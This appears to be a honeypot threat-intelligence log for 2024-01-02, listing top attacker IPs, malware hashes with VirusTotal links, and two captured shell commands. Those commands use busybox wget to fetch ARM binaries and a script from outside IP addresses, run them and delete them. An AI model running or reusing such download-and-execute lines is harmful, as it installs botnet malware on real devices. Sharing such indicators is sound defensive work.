@@ -1,0 +1,24 @@
+Top 5 IPs for 2024-01-02:
+
+125.80.156.194
+103.180.148.159
+103.72.57.192
+46.5.74.210
+103.180.149.156
+
+
+Malware download: 
+
+0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+https://www.virustotal.com/gui/file/0d3c687ffc30e185b836b99bd07fa2b0d460a090626f6bbbd40a95b98ea70257
+71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+https://www.virustotal.com/gui/file/71ecfb7bbc015b2b192c05f726468b6f08fcc804c093c718b950e688cc414af5
+76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+https://www.virustotal.com/gui/file/76ae6d577ba96b1c3a1de8b21c32a9faf6040f7e78d98269e0469d896c29dc64
+a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+https://www.virustotal.com/gui/file/a1b6223a3ecb37b9f7e4a52909a08d9fd8f8f80aee46466127ea0f078c7f5437
+
+Malicious commands seen:
+
+cd /data/local/tmp/; busybox wget http://2.58.113.242/popbang.arm7; chmod 777 popbang.arm7; ./popbang.arm7 taco; rm -rf *
+cd /data/local/tmp; busybox wget http://5.181.80.102/armv7l; chmod 777 armv7l; ./armv7l; rm -rf armv7l; busybox wget http://5.181.80.102/bins.sh; sh bins.sh; rm -rf bins.sh
